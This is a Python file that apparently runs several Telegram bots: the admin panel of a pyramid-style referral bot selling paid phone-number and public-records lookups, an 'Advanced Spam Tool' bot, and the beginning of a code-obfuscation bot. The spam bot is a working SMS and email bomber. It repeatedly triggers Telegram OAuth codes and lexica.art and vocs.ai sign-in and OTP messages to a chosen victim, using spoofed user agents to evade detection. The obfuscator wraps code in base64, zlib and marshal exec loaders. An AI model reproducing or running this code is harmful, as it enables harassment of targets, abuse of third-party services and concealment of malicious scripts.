            InlineKeyboardButton("📅 آخر 24 ساعة", callback_data="admin_logs_24h"),
            InlineKeyboardButton("📆 آخر 7 أيام", callback_data="admin_logs_7d"),
            InlineKeyboardButton("📊 إحصائيات البحث", callback_data="admin_search_stats"),
            InlineKeyboardButton("🔄 تحديث", callback_data="admin_search_logs")
        )
        
        bot.send_message(message.chat.id, logs_text, parse_mode='Markdown', reply_markup=markup)
    
    def show_revenue_analytics(message):
        """تحليل الإيرادات"""
        stats = get_advanced_system_stats()
        
        revenue_text = f"""
    💰 تحليل الإيرادات
    
    📈 الإيرادات:
    • الإجمالي: ${stats['total_revenue']}
    • الشهري: ${stats['total_revenue']}
    • اليومي: ${stats['total_revenue']/30:.2f}
    
    💎 الباقات:
    • الباقة الفضية: ${BOT_CONFIG['subscription_plans']['silver']['price']}
    • الباقة الذهبية: ${BOT_CONFIG['subscription_plans']['gold']['price']}
    • الباقة البلاتينية: ${BOT_CONFIG['subscription_plans']['platinum']['price']}
    
    📊 التوقعات:
    • الإيرادات الشهرية المتوقعة: ${stats['total_revenue'] * 1.2:.2f}
        """
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🔄 تحديث", callback_data="admin_revenue"),
            InlineKeyboardButton("📥 تصدير تقرير", callback_data="admin_export_data")
        )
        
        bot.send_message(message.chat.id, revenue_text, parse_mode='Markdown', reply_markup=markup)
    
    def show_pyramid_analytics(message):
        """عرض تحليلات الهرم المتقدمة"""
        stats = get_advanced_system_stats()
        pyramid_data = stats["pyramid_distribution"]
        
        analytics_text = f"""
    🔮 تحليلات الهرم المتقدمة
    
    📈 التوزيع الهرمي:
    {chr(10).join([f'• المستوى {k.split("_")[1] if "_" in k else k}: {v} مستخدم' for k, v in pyramid_data.items()])}
    
    💎 نقاط الهرم:
    {chr(10).join([f'• المستوى {k.split("_")[1]}: {BOT_CONFIG["pyramid_levels"][k]["points"]} نقطة لكل إحالة' for k in BOT_CONFIG["pyramid_levels"].keys()])}
    
    📊 الإحصائيات الشبكية:
    • إجمالي نقاط الهرم: {sum([pyramid_data.get(k, 0) * BOT_CONFIG["pyramid_levels"][k]["points"] for k in BOT_CONFIG["pyramid_levels"].keys()])}
    • متوسط المستوى: {sum([int(k.split('_')[1]) * v for k, v in pyramid_data.items()]) / sum(pyramid_data.values()) if sum(pyramid_data.values()) > 0 else 0:.2f}
        """
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🔄 تحديث التحليلات", callback_data="admin_pyramid_analytics"),
            InlineKeyboardButton("📥 تصدير البيانات", callback_data="admin_export_data")
        )
        
        bot.send_message(message.chat.id, analytics_text, parse_mode='Markdown', reply_markup=markup)
    
    def show_admin_notifications(message):
        """عرض إشعارات الإدارة"""
        conn = sqlite3.connect(BOT_CONFIG["database_url"])
        c = conn.cursor()
        
        c.execute("SELECT message, type, timestamp FROM admin_notifications WHERE is_read = 0 ORDER BY timestamp DESC LIMIT 10")
        notifications = c.fetchall()
        
        conn.close()
        
        if not notifications:
            notifications_text = "🔔 لا توجد إشعارات جديدة"
        else:
            notifications_list = []
            for i, (msg, notif_type, timestamp) in enumerate(notifications, 1):
                try:
                    time_ago = datetime.now() - datetime.fromisoformat(timestamp)
                    hours_ago = int(time_ago.total_seconds() / 3600)
                    notifications_list.append(f"{i}. {msg} ({hours_ago} ساعة مضت)")
                except:
                    notifications_list.append(f"{i}. {msg}")
            
            notifications_text = f"""
    🔔 آخر الإشعارات
    
    {chr(10).join(notifications_list)}
            """
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("📋 جميع الإشعارات", callback_data="admin_all_notifications"),
            InlineKeyboardButton("🗑 مسح الإشعارات", callback_data="admin_clear_notifications"),
            InlineKeyboardButton("🔄 تحديث", callback_data="admin_notifications")
        )
        
        bot.send_message(message.chat.id, notifications_text, parse_mode='Markdown', reply_markup=markup)
    
    def generate_full_report(message):
        """إنشاء تقرير شامل"""
        stats = get_advanced_system_stats()
        
        report_text = f"""
    📋 تقرير النظام الشامل - البحث الشامل
    ⏰ تاريخ التقرير: {datetime.now().strftime("%Y-%m-%d %H:%M")}
    
    🎯 ملخص الأداء:
    • 📈 نمو المستخدمين: +{stats['new_users']} (آخر 30 يوم)
    • 💰 الإيرادات: ${stats['total_revenue']}
    • 🔍 نشاط البحث: {stats['daily_searches']} عملية/يوم
    
    🔮 توقعات النمو:
    • المستخدمون المتوقعون: {int(stats['total_users'] * 1.15)} (الشهر القادم)
    • الإيرادات المتوقعة: ${int(stats['total_revenue'] * 1.2)} 
    • نمو البحث: +{int(stats['daily_searches'] * 1.1)} عملية/يوم
    
    ⚠️ التوصيات:
    1. تحسين أداء البحث لزيادة السرعة
    2. تقديم عروض للباقات المميزة
    3. تحسين نظام الإحالات
        """
        
        if message.from_user.id == owner_id:
            report_text += "\n\n👨‍💻 ملاحظات المطور:\n• النظام يعمل بشكل مستقر\n• لا توجد أخطاء حرجة\n• الأداء ضمن المعدلات الطبيعية"
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("📥 تصدير التقرير", callback_data="admin_export_data"),
            InlineKeyboardButton("🔄 إنشاء جديد", callback_data="admin_full_report")
        )
        
        bot.send_message(message.chat.id, report_text, parse_mode='Markdown', reply_markup=markup)
    
    def show_advanced_settings(message):
        """عرض الإعدادات المتقدمة"""
        settings_text = f"""
    ⚙️ الإعدادات المتقدمة - البحث الشامل
    
    🔧 إعدادات النظام:
    • الحد الأقصى للبحث المتزامن: {BOT_CONFIG['max_concurrent_searches']}
    • مهلة البحث: {BOT_CONFIG['search_timeout']} ثانية
    • مدة التخزين المؤقت: {BOT_CONFIG['cache_duration']} ثانية
    
    💰 أسعار البحث:
    • بحث تليجرام: {BOT_CONFIG['search_costs']['telegram']} نقطة
    • وسائل التواصل: {BOT_CONFIG['search_costs']['social_media']} نقطة
    • السجلات العامة: {BOT_CONFIG['search_costs']['public_records']} نقطة
    • رقم الهاتف: {BOT_CONFIG['search_costs']['phone_number']} نقطة
    • تحليل الهرم: {BOT_CONFIG['search_costs']['pyramid_analysis']} نقطة
    
    🔄 خيارات التحديث:
        """
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🔄 تحديث الإعدادات", callback_data="admin_advanced_settings"),
            InlineKeyboardButton("🔙 العودة", callback_data="admin_main")
        )
        
        bot.send_message(message.chat.id, settings_text, parse_mode='Markdown', reply_markup=markup)
    
    # معالجات لوحة الإدارة
    @bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
    def handle_admin_callbacks(call):
        user_id = call.from_user.id
        if user_id != owner_id:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك بالوصول!", show_alert=True)
            return
        
        if call.data == "admin_detailed_stats":
            show_detailed_stats(call.message)
        elif call.data == "admin_manage_users":
            show_user_management(call.message)
        elif call.data == "admin_search_logs":
            show_search_logs(call.message)
        elif call.data == "admin_revenue":
            show_revenue_analytics(call.message)
        elif call.data == "admin_pyramid_analytics":
            show_pyramid_analytics(call.message)
        elif call.data == "admin_notifications":
            show_admin_notifications(call.message)
        elif call.data == "admin_full_report":
            generate_full_report(call.message)
        elif call.data == "admin_points_management":
            show_points_management(call.message)
        elif call.data == "admin_subscriptions_management":
            show_subscriptions_management(call.message)
        elif call.data == "admin_refresh":
            admin_panel(call.message)
        elif call.data == "admin_advanced_settings":
            show_advanced_settings(call.message)
        elif call.data == "admin_logs_24h":
            show_logs_24h(call.message)
        elif call.data == "admin_logs_7d":
            show_logs_7d(call.message)
        elif call.data == "admin_search_stats":
            show_search_stats(call.message)
        elif call.data == "admin_search_user":
            search_user(call.message)
        elif call.data == "admin_top_users":
            show_top_users(call.message)
        elif call.data == "admin_ban_management":
            ban_management(call.message)
        elif call.data == "admin_all_notifications":
            show_all_notifications(call.message)
        elif call.data == "admin_clear_notifications":
            clear_notifications(call.message)
        elif call.data == "admin_export_data":
            export_data(call.message)
        elif call.data == "admin_main":
            admin_panel(call.message)
        
        bot.answer_callback_query(call.id)
    
    def show_points_management(message):
        """إدارة النقاط"""
        points_text = """
    💎 إدارة النقاط - لوحة المسؤول
    
    🎯 الأدوات المتاحة:
    • إضافة نقاط للمستخدمين
    • خصم نقاط من المستخدمين
    • تعيين نقاط محددة
    • عرض تاريخ النقاط
    
    🔧 اختر الإجراء المطلوب:
        """
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("➕ إضافة نقاط", callback_data="admin_add_points"),
            InlineKeyboardButton("➖ خصم نقاط", callback_data="admin_remove_points"),
            InlineKeyboardButton("🔢 تعيين نقاط", callback_data="admin_set_points"),
            InlineKeyboardButton("📋 عرض جميع المستخدمين", callback_data="admin_view_all_users_points"),
            InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="admin_main")
        )
        
        bot.send_message(message.chat.id, points_text, parse_mode='Markdown', reply_markup=markup)
    
    
    try:
        start_bot_monitoring()
        add_admin_notification("🟢 النظام يعمل الآن - البحث الشامل", "system", 3)
        
        bot_username = bot.get_me().username
        print(f"✅ Pyramid bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Pyramid bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
def run_spam_bot(token, owner_id, data_dir):
    """
    تشغيل بوت السبام (SMS & Email Spam)
    """
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    
    FPI = {
        "🇮🇶 ꒒ꀎꋪꍏꀸ": "+964",
        "🇪🇬 ꍟꈤꏳ꓄ꋪ": "+20", 
        "🇸🇦 ꇙꍏꀎꀸꀸ": "+966",
        "🇯🇴 ꒐ꂦꋪꀸꍏꈤ": "+962",
        "🇸🇾 ꇙꌦꋪꀸꍏ": "+963",
        "🇱🇧 ꒒ꍟꀎꍏꈤꂦꈤ": "+961",
        "🇵🇸 ꉣꍏ꒒ꍟꇙ꓄ꀸꍏ": "+970",
        "🇾🇪 ꌦꍟꎭꍟꈤ": "+967",
        "🇴🇲 ꂦꎭꍏꈤ": "+968",
        "🇦🇪 ꀎꍏꍟ": "+971",
        "🇶🇦 ꆰꍏ꓄ꍏꋪ": "+974",
        "🇧🇭 ꌃꍏꃅꋪꍏꀸꈤ": "+973",
        "🇰🇼 ꀘꅏꍏꀸ꓄": "+965",
        "🇩🇿 ꍏ꒒ꈤꍟꋪꀸꍏ": "+213",
        "🇲🇦 ꎭꂦꋪꂦꀘꀘꂦ": "+212",
        "🇹🇳 ꓄ꀎꈤꇙꀸꍏ": "+216",
        "🇱🇾 ꒒ꀸꌃꌦꍏ": "+218",
        "🇸🇩 ꇙꀎꀸꍏꈤ": "+249",
        "🇸🇸 ꇙꂦꀎ꓄ꃅ": "+211",
        "🇸🇴 ꇙꂦꎭꍏ꒒ꀸꍏ": "+252",
        "🇩🇯 ꀸ꒐ꀎꌃꂦꀎ꓄ꀸ": "+253",
        "🇲🇷 ꎭꍏꀎꋪꀸꍏ꓄ꀸꀸꍏ": "+222",
        "🇰🇲 ꀘꂦꎭꂦꋪꂦꇙ": "+269"
    }
    
    
    user_data = {}
    
    # وظائف لإنشاء User-Agent
    def dalvik():
        vr = ["1.6.0", "2.1.0", "2.1.2"]
        an = ["7.0", "8.1", "9", "10", "11", "12", "13"]
        dev = [
            "SM-G960F", "SM-G975F", "SM-N960F", "Pixel 4", "Pixel 5", "Nexus 6", 
            "OnePlus 7T", "HUAWEI P30", "Xiaomi Mi 9", "Redmi Note 8", "OPPO Reno2"
        ]
        sos = [
            "QP1A.190711.020", "RP1A.200720.012", "PPR1.180610.011", 
            "NRD90M", "QKQ1.190910.002", "LMY47V"
        ]
        nano = random.choice(vr)  
        com = random.choice(an)
        mod = random.choice(dev)
        lp = random.choice(sos)
        user_agent = f"Dalvik/{nano} (Linux; U; Android {com}; {mod} Build/{lp})"
        return user_agent
    
    def Users(browser_type=random.choice(['chrome', 'kiwi', 'brave', 'edge'])):
        lop = ["9", "10", "11", "12", "13", "14"]
        sms = [
            "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Samsung Galaxy S21",
            "Samsung Galaxy S22", "Samsung Galaxy Note 20", "OnePlus 9", "OnePlus 10 Pro",
            "Xiaomi Mi 11", "Huawei P40", "Sony Xperia 1 III"
        ]
        ml = random.randint(89, 117)
        oop = random.randint(537, 540)
        mmk = random.choice(lop)
        awq = random.choice(sms)
        
        if browser_type == "chrome":
            user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36"
        elif browser_type == "kiwi":
            user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Kiwi/{ml}.0.0.0 Mobile Safari/{oop}.36"
        elif browser_type == "brave":
            user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 Brave/{ml}.0.0.0"
        elif browser_type == "edge":
            user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 EdgA/{ml}.0.0.0"
        return user_agent
    
    def IOS():
        los = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0"]
        dec = [
            "iPhone12,1", "iPhone12,3", "iPhone13,4", "iPhone14,2", 
            "iPhone14,5", "iPhone15,2", "iPad8,1", "iPad8,9", "iPad11,6",
        ]       
        web = random.randint(600, 605)
        sf = random.randint(14, 17)   
        nok = random.choice(los)
        mod = random.choice(dec)
        user_agent = f"Mozilla/5.0 (iPhone; CPU iPhone OS {nok.replace('.', '_')} like Mac OS X) AppleWebKit/{web}.1 (KHTML, like Gecko) Version/{sf}.0 Mobile/15E148 Safari/{web}.1"
        return user_agent
    
    
    def spam_phone(number, count, chat_id):
        for i in range(count):
            agent = random.choice([IOS(), Users(), dalvik(), generate_user_agent()])
            payload = f"phone={number}"
            headers = {
                'User-Agent': agent,
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Content-Type': "application/x-www-form-urlencoded",
                'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Android WebView\";v=\"128\"",
                'sec-ch-ua-platform': "\"Android\"",
                'x-requested-with': "XMLHttpRequest",
                'sec-ch-ua-mobile': "?1",
                'origin': "https://oauth.telegram.org",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write",
                'accept-language': "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
                'priority': "u=1, i",
            }
            try:
                response = requests.post(
                    "https://oauth.telegram.org/auth/request", 
                    params={
                        'bot_id': "5444323279",
                        'origin': "https://fragment.com",
                        'request_access': "write",
                    }, 
                    data=payload, 
                    headers=headers
                )
                effects = ["✨", "✅", "🚀", "💫", "⚡"]
                effect = random.choice(effects)
                bot.send_message(chat_id, f"{effect} SMS {i+1} sent successfully")
            except:
                effects = ["❌", "⚠️", "💥", "🔴"]
                effect = random.choice(effects)
                bot.send_message(chat_id, f"{effect} Error sending SMS {i+1}")
    
    
    def L0():
        url = "https://lexica.art/api/auth/csrf"
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.70 Mobile Safari/537.36",
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            csrf_token = data["csrfToken"]
            cookies = response.cookies
            csrf_token0 = cookies.get("__Host-next-auth.csrf-token")
            return csrf_token, csrf_token0
        else:
            return None, None
    
    def F0(csrf_token, csrf_token0, email):
        url = "https://lexica.art/api/auth/signin/email"
        payload = f"email={email}&redirect=false&callbackUrl=https%3A%2F%2Flexica.art%2Faccount&csrfToken={csrf_token}"
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.70 Mobile Safari/537.36",
            'Content-Type': "application/x-www-form-urlencoded",
            'Cookie': f"__Host-next-auth.csrf-token={csrf_token0}; __Secure-next-auth.callback-url=https%3A%2F%2Flexica.art"
        }
        response = requests.post(url, data=payload, headers=headers)
        return response
    
    def spam_email(email, count, chat_id):
        csrf_token, csrf_token0 = L0()
        if not csrf_token or not csrf_token0:
            bot.send_message(chat_id, "❌ Failed to get CSRF token")
            return
        
        for i in range(count):
            response = F0(csrf_token, csrf_token0, email)
            if response.status_code == 200:
                effects = ["📧", "✉️", "✅", "✨"]
                effect = random.choice(effects)
                bot.send_message(chat_id, f"{effect} Email {i+1} sent to {email}")
            else:
                effects = ["❌", "⚠️", "💢"]
                effect = random.choice(effects)
                bot.send_message(chat_id, f"{effect} Error sending email {i+1}: {response.status_code}")
            
            
            url = "https://backend.vocs.ai/api/user/sendotp"
            payload = json.dumps({"email": email})
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                'Content-Type': "application/json",
                'access-control-allow-origin': "*",
                'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': "\"Android\"",
                'origin': "https://www.vocs.ai",
                'sec-fetch-site': "same-site",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://www.vocs.ai/",
                'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
            }
            
            vocs_response = requests.post(url, data=payload, headers=headers)
            if vocs_response.status_code == 200:
                effects = ["🔐", "🔑", "🔢"]
                effect = random.choice(effects)
                bot.send_message(chat_id, f"{effect} OTP sent to {email}")
            else:
                bot.send_message(chat_id, f"❌ Error sending OTP {i+1}: {vocs_response.status_code}")
    
    
    def create_decorated_text(text, style="normal"):
        if style == "title":
            return f"╔═━━━━━ ✦ ━━━━━═╗\n     {text}\n╚═━━━━━ ✦ ━━━━━═╝"
        elif style == "subtitle":
            return f"┌───────── ✦ ─────────┐\n    {text}\n└───────── ✦ ─────────┘"
        elif style == "box":
            return f"╭─────────────╮\n   {text}\n╰─────────────╯"
        else:
            return f"│ {text} │"
    
    # دالة لإنشاء زر Inline Keyboard Button
    def create_inline_button(text, callback_data=None, url=None, emoji=""):
        if url:
            return telebot.types.InlineKeyboardButton(f"{emoji} {text}", url=url)
        else:
            return telebot.types.InlineKeyboardButton(f"{emoji} {text}", callback_data=callback_data)
    
    # الحصول على معلومات المطور (صانع البوت)
    def get_developer_info():
        try:
            owner_info = bot.get_chat(owner_id)
            if hasattr(owner_info, 'username') and owner_info.username:
                return f"https://t.me/{owner_info.username}"
            else:
                return f"tg://user?id={owner_id}"
        except Exception as e:
            print(f"Error getting developer info: {e}")
            return f"tg://user?id={owner_id}"
    
    # معالجة الأمر /start
    @bot.message_handler(commands=['start'])
    def start(message):
        # الحصول على رابط المطور الحقيقي (صانع البوت)
        developer_link = get_developer_info()
        
        # إنشاء نص الترحيب
        welcome_text = create_decorated_text("𝗦𝗣𝗔𝗠 𝗕𝗢𝗧", "title") + "\n\n"
        welcome_text += create_decorated_text("Advanced Spam Tool", "subtitle") + "\n\n"
        welcome_text += "Select service:"
        
        # إنشاء Inline Keyboard
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        
        # أزرار فقط (تم حذف قناة التحديثات)
        btn1 = create_inline_button("📧 Email Spam", "email_spam", emoji="📧")
        btn2 = create_inline_button("ELZo_z@", url=developer_link, emoji="@ELZo_z")  # زر المطور يوجه لصانع البوت
        
        markup.add(btn1, btn2)
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
    
    # معالجة Inline Buttons
    @bot.callback_query_handler(func=lambda call: True)
    def handle_callback(call):
        if call.data == "email_spam":
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=create_decorated_text("Email Spam", "subtitle") + "\n\n" + "Please send the target email address:"
            )
            user_data[call.message.chat.id] = {'mode': 'email_input'}
            
        elif call.data == "back_to_main":
            # الحصول على رابط المطور الحقيقي (صانع البوت)
            developer_link = get_developer_info()
            
            # العودة للقائمة الرئيسية
            welcome_text = create_decorated_text("𝗦𝗣𝗔𝗠 𝗕𝗢𝗧", "title") + "\n\n"
            welcome_text += create_decorated_text("Advanced Spam Tool", "subtitle") + "\n\n"
            welcome_text += "Select service:"
            
            markup = telebot.types.InlineKeyboardMarkup(row_width=2)
            btn1 = create_inline_button("📧 Email Spam", "email_spam", emoji="📧")
            btn2 = create_inline_button("👑 المطور", url=developer_link, emoji="👑")  # زر المطور يوجه لصانع البوت
            
            markup.add(btn1, btn2)
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=welcome_text,
                reply_markup=markup
            )
            
            if call.message.chat.id in user_data:
                del user_data[call.message.chat.id]
    
    # معالجة الرسائل النصية
    @bot.message_handler(func=lambda message: True)
    def handle_messages(message):
        if message.chat.id in user_data:
            mode = user_data[message.chat.id].get('mode')
            
            if mode == 'email_input':
                # إدخال الإيميل
                if '@' in message.text and '.' in message.text:
                    user_data[message.chat.id]['email'] = message.text
                    user_data[message.chat.id]['mode'] = 'email_count'
                    
                    email_info = create_decorated_text("📧 Email Confirmed", "subtitle") + "\n\n"
                    email_info += f"Email: {message.text}\n\n"
                    email_info += "Enter number of emails (10-500):"
                    
                    bot.send_message(message.chat.id, email_info)
                else:
                    error_msg = create_decorated_text("❌ Invalid Email", "box") + "\n"
                    error_msg += "Please enter a valid email address."
                    bot.send_message(message.chat.id, error_msg)
                    
            elif mode == 'email_count':
                # إدخال عدد مرات السبام للإيميل
                try:
                    count = int(message.text)
                    if 10 <= count <= 500:
                        email = user_data[message.chat.id]['email']
                        
                        start_info = create_decorated_text("🚀 Starting Email Spam", "subtitle") + "\n\n"
                        start_info += f"📧 Target: {email}\n"
                        start_info += f"🔢 Messages: {count}\n\n"
                        start_info += "Status: Processing..."
                        
                        bot.send_message(message.chat.id, start_info)
                        
                        # تشغيل السبام في ثانٍ منفصل
                        thread = threading.Thread(target=spam_email, args=(email, count, message.chat.id))
                        thread.start()
                        
                        # العودة للقائمة الرئيسية
                        del user_data[message.chat.id]
                        
                        # إرسال زر للعودة للقائمة الرئيسية
                        markup = telebot.types.InlineKeyboardMarkup()
                        markup.add(create_inline_button("🏠 Back to Main", "back_to_main", emoji="🏠"))
                        
                        success_msg = create_decorated_text("✅ Email Spam Started", "box") + "\n"
                        success_msg += "Email spam process has been started!"
                        
                        bot.send_message(message.chat.id, success_msg, reply_markup=markup)
                        
                    else:
                        error_msg = create_decorated_text("⚠️ Invalid Count", "box") + "\n"
                        error_msg += "Please enter a number between 10 and 500."
                        bot.send_message(message.chat.id, error_msg)
                except:
                    error_msg = create_decorated_text("❌ Error", "box") + "\n"
                    error_msg += "Invalid input! Please enter a valid number."
                    bot.send_message(message.chat.id, error_msg)
    
    try:
        bot_username = bot.get_me().username
        print(f"✅ Spam bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Spam bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]

# ==============================================================================
# ⬇️⬇️⬇️ -- دالة تشغيل بوت التشفير (Encryption Bot) -- ⬇️⬇️⬇️
# ==============================================================================
def run_encryption_bot(token, owner_id, data_dir):
    """
    تشغيل بوت التشفير المتطور (مع 8 أنواع تشفير + مميزات إضافية)
    """
    import telebot
    import base64
    import marshal
    import zlib
    import hashlib
    import json
    import os
    import time
    import random
    from datetime import datetime
    from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # ==================== متغيرات النظام المتقدم ====================
    user_stats = {}  # إحصائيات المستخدمين
    encryption_history = {}  # سجل عمليات التشفير
    premium_users = set()  # مستخدمين متميزين
    encryption_methods_info = {
        'base64': {'name': 'Base64', 'level': 'سهل', 'security': '🔓', 'speed': '⚡ سريع'},
        'lambda': {'name': 'Lambda', 'level': 'متوسط', 'security': '🔒', 'speed': '⚡⚡'},
        'marshal': {'name': 'Marshal', 'level': 'متقدم', 'security': '🔒🔒', 'speed': '⚡'},
        'zlib': {'name': 'Zlib + Marshal', 'level': 'متقدم جداً', 'security': '🔒🔒🔒', 'speed': '⚡⚡'},
        'base85': {'name': 'Base85 Premium', 'level': 'متميز', 'security': '🔒🔒🔒🔒', 'speed': '⚡⚡⚡'},
        'hex': {'name': 'Hexadecimal', 'level': 'سهل', 'security': '🔓', 'speed': '⚡⚡⚡⚡'},
        'xor': {'name': 'XOR Encryption', 'level': 'متقدم', 'security': '🔒🔒🔒', 'speed': '⚡⚡'},
        'aes': {'name': 'AES Simulation', 'level': 'متميز', 'security': '🔒🔒🔒🔒🔒', 'speed': '⚡'}
    }
    
    # ==================== دوال التشفير المحسنة ====================
    def encode_files(name, file_name, user_id=None):
        """
        تشفير الملفات بطرق متقدمة مع تتبع الإحصائيات
        """
        try:
            start_time = time.time()
            
            with open(file_name, 'rb') as f:
                original_content = f.read()
            
            file_size = len(original_content)
            file_hash = hashlib.md5(original_content).hexdigest()[:8]
            
            # تحديث إحصائيات المستخدم
            if user_id:
                if user_id not in user_stats:
                    user_stats[user_id] = {
                        'total_encrypted': 0,
                        'total_size': 0,
                        'methods_used': {},
                        'last_activity': None
                    }
                
                user_stats[user_id]['total_encrypted'] += 1
                user_stats[user_id]['total_size'] += file_size
                user_stats[user_id]['methods_used'][name] = user_stats[user_id]['methods_used'].get(name, 0) + 1
                user_stats[user_id]['last_activity'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # أنواع التشفير المتقدمة
            encoded_content = None
            
            if name == 'marshal':
                en = marshal.dumps(compile(original_content, file_name, 'exec'))
                encoded_content = f"""# 🔒 Python Code - Marshal Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: Marshal Encryption (Advanced)
# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}

import marshal
import sys

def execute_encrypted():
    try:
        encrypted_code = {repr(en)}
        exec(marshal.loads(encrypted_code))
    except Exception as e:
        print(f"❌ Decryption Error: {{e}}")
        sys.exit(1)

if __name__ == "__main__":
    execute_encrypted()"""
                
            elif name == 'base64':
                en = base64.b64encode(original_content)
                encoded_content = f"""# 🔒 Python Code - Base64 Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: Base64 Encryption (Basic)
# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}

import base64

def decode_and_execute():
    encrypted_code = {repr(en)}
    decoded_code = base64.b64decode(encrypted_code)
    exec(decoded_code)

if __name__ == "__main__":
    decode_and_execute()"""
                
            elif name == 'lambda':
                en = zlib.compress(original_content)
                encoded_content = f"""# 🔒 Python Code - Lambda + Zlib Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: Lambda + Zlib Encryption (Medium)
# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}

import zlib

# 🎭 Lambda obfuscation layer
execute = lambda code: exec(zlib.decompress(code))

encrypted_payload = {repr(en)}

if __name__ == "__main__":
    try:
        execute(encrypted_payload)
    except Exception as e:
        print(f"⚠️ Execution Error: {{e}}")"""
                
            elif name == 'zlib':
                en = zlib.compress(marshal.dumps(compile(original_content, file_name, 'exec')))
                encoded_content = f"""# 🔒 Python Code - Zlib + Marshal Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: Zlib + Marshal Encryption (Advanced)
# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}

import zlib, marshal

class Decryptor:
    def __init__(self, encrypted_data):
        self.encrypted_data = encrypted_data
    
    def decrypt(self):
        try:
            decompressed = zlib.decompress(self.encrypted_data)
            code_object = marshal.loads(decompressed)
            exec(code_object)
        except Exception as e:
            print(f"🔐 Decryption Failed: {{e}}")

encrypted_code = {repr(en)}
decryptor = Decryptor(encrypted_code)

if __name__ == "__main__":
    decryptor.decrypt()"""
            
            elif name == 'base85':
                # تشفير Base85 (متميز)
                import base64
                en = base64.b85encode(original_content)
                encoded_content = f"""# 🔐 Python Code - Base85 Premium Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: Base85 Premium Encryption (Exclusive)
# 📊 File Hash: {file_hash}
# 👤 User ID: {user_id or 'Anonymous'}
# ⭐ Premium Feature

import base64

class PremiumDecryptor:
    @staticmethod
    def decrypt(encrypted):
        return base64.b85decode(encrypted)
    
    @staticmethod
    def execute(decrypted):
        exec(decrypted)

encrypted_data = {repr(en)}

if __name__ == "__main__":
    try:
        decrypted = PremiumDecryptor.decrypt(encrypted_data)
        PremiumDecryptor.execute(decrypted)
    except Exception as e:
        print(f"💎 Premium Decryption Error: {{e}}")"""
            
            elif name == 'hex':
                # تشفير Hex
                en = original_content.hex()
                encoded_content = f"""# 🔐 Python Code - Hexadecimal Encrypted
# 📅 Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
# 🔑 Method: Hexadecimal Encryption (Basic)
